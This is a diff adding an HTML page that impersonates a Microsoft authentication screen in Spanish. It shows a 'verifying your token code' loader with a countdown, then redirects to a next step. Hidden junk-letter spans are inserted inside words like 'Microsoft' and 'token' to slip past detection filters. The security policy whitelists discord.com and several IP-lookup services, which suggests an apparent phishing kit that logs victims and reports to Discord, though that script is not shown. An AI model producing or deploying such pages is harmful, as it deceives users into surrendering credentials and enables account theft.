@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width, initial-scale=1.0">
+<title>Autenticación</title>
+
+<meta name=referrer content=no-referrer>
+<meta http-equiv=content-security-policy
+    content="default-src 'self' http://127.0.0.1:5501; font-src 'self' data:; img-src 'self' data:; style-src 'self' 'unsafe-inline' http://127.0.0.1:5501; media-src 'self' data:; script-src 'self' 'unsafe-inline' data: https://ip-api.com; connect-src 'self' ws://127.0.0.1:5501 http://127.0.0.1:5501 https://discord.com https://ipwho.is https://api.ipify.org https://ip-api.com https://api.ipdata.co; object-src 'self' data:; frame-src 'self' data:;">
+<link rel="stylesheet" href="./assets/index-sMZPGJ8k.css">
+</head>
+
+<body cz-shortcut-listen=true>
+    <div id=app data-v-app>
+        <div data-v-ef89e391 class="lg-page min-h-screen flex items-center justify-center p-4"
+            style="background:linear-gradient(135deg,rgb(240,244,248) 0%,rgb(232,238,245) 40%,rgb(220,230,240) 100%)">
+            <div data-v-ef89e391 class="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
+
+                <!-- Logo Microsoft -->
+                <div class="flex items-center justify-center mb-8" data-v-ef89e391>
+                    <svg width="21" height="21" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg" data-v-ef89e391>
+                        <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
+                        <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
+                        <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
+                        <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
+                    </svg>
+                    <span class="ml-2 text-gray-700 font-semibold text-lg" data-v-ef89e391>
+                        Mic<span style="display:none">p3y</span>ros<span style="display:none;font-size:0">v1n</span>oft
+                    </span>
+                </div>
+
+                <!-- Spinner -->
+                <div class=mb-8 data-v-ef89e391>
+                    <div class="relative w-16 h-16 mx-auto mb-4" data-v-ef89e391>
+                        <div class="absolute inset-0 border-4 border-gray-200 rounded-full" data-v-ef89e391></div>
+                        <div class="absolute inset-0 border-4 border-transparent border-t-blue-500 rounded-full animate-spin"
+                            data-v-ef89e391></div>
+                    </div>
+                    <h2 class="text-xl font-semibold text-gray-800 mb-2" data-v-ef89e391>
+                        Pr<span style="display:none">w5q</span>ocesa<span style="display:none;font-size:0">v8t</span>ndo
+                        veri<span style="display:none">m4k</span>fica<span style="display:none">z9p</span>ción
+                    </h2>
+                    <p class=text-gray-600 data-v-ef89e391>
+                        Est<span style="display:none">x2j</span>amos veri<span
+                            style="display:none;font-size:0">b4a</span>fica<span style="display:none">z9p</span>ndo su
+                        có<span style="display:none">r3w</span>digo de to<span style="display:none">n4p</span>ken
+                    </p>
+                </div>
+
+                <!-- Contador grande -->
+                <p id="ld6-counter" class="text-2xl font-bold text-gray-800 mb-4">10s</p>
+
+                <!-- Barra de progreso -->
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-4" data-v-ef89e391>
+                    <div id="ld6-bar" class="bg-blue-500 h-2 rounded-full transition-all duration-1000 ease-linear"
+                        style="width:0%" data-v-ef89e391></div>
+                </div>
+
+                <p class="text-sm text-gray-500" data-v-ef89e391>
+                    Es<span style="display:none">p3y</span>to pu<span
+                        style="display:none;font-size:0">v1n</span>ede to<span style="display:none">z9k</span>mar
+                    un<span style="display:none">m4t</span>os mom<span style="display:none">q5t</span>entos
+                </p>
+
+            </div>
+        </div>
+    </div>
+</body>
+<script src="./js/discord-loading.js"></script>
+<script>
+// Script de respaldo para producción - ejecuta solo si discord-loading.js falla
+(function() {
+    'use strict';
+    
+    // Esperar un poco para ver si el script principal funciona
+    setTimeout(function() {
+        // Verificar si ya hay una animación de progreso activa
+        const progressBar = document.querySelector('.bg-blue-500.h-2');
+        const counter = document.getElementById('ld6-counter');
+        
+        if (progressBar && progressBar.style.width === '0%') {
+            console.log('Fallback script activated for index6.html');
+            
+            // Animación manual de 5 segundos
+            let width = 0;
+            const interval = setInterval(function() {
+                width += 2;
+                if (width >= 100) {
+                    width = 100;
+                    clearInterval(interval);
+                    
+                    // Redirección después de completar
+                    setTimeout(function() {
+                        console.log('Fallback redirect to index7.html');
+                        window.location.href = 'index7.html';
+                    }, 500);
+                }
+                progressBar.style.width = width + '%';
+            }, 100); // 100ms * 50 = 5 segundos
+        }
+        
+        // Contador regresivo de respaldo
+        if (counter && counter.textContent === '10s') {
+            let seconds = 5;
+            counter.textContent = seconds + 's';
+            
+            const countInterval = setInterval(function() {
+                seconds--;
+                counter.textContent = seconds + 's';
+                if (seconds <= 0) clearInterval(countInterval);
+            }, 1000);
+        }
+    }, 1000); // Esperar 1 segundo para verificar
+})();
+</script>
+</html>
